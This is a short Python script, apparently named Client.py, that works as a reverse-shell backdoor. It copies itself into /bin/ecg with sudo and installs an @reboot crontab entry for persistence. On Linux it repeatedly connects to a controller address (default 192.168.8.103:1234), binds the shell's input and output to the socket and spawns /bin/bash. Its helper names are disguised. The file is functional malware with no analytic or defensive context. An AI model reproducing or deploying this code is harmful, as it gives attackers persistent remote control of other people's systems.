# encoding: UTF-8

import os
import platform
import socket
import subprocess
import sys
import threading
import time
import pty


sk=(socket)
ssm=(socket.SOCK_STREAM)
osn = platform.system()


try:
    ipadd = (sys.argv[1])
except:
    ipadd = "192.168.8.103"

try:
    port = int(sys.argv[2])
except:
    port = 1234


def sundries():
    try:
        sause = os.getcwd()+"/Client.py"; holidays = "/bin/ecg"
        os.system(f'sudo cp {sause}  {holidays}')
        os.system("(crontab -l 2>/dev/null; echo '@reboot sleep 60 && /bin/ecg 127.0.0.1 1234') | crontab -")
    except Exception as e:
        print(e)

if os.path.isfile("/bin/ecg"):
    print()

else:
    sundries()


#linux 
if osn =="Linux":
    s=sk.socket(sk.AF_INET,ssm)
    for n in  range(8640):
        try:
            s.connect((ipadd,port))
        except Exception as e:
            time.sleep(10)
        else:
            os.dup2(s.fileno(),0)
            os.dup2(s.fileno(),1)
            os.dup2(s.fileno(),2)
            stdout,stderr, returncode = pty.spawn("/bin/bash")
while True:
    time.sleep(1)
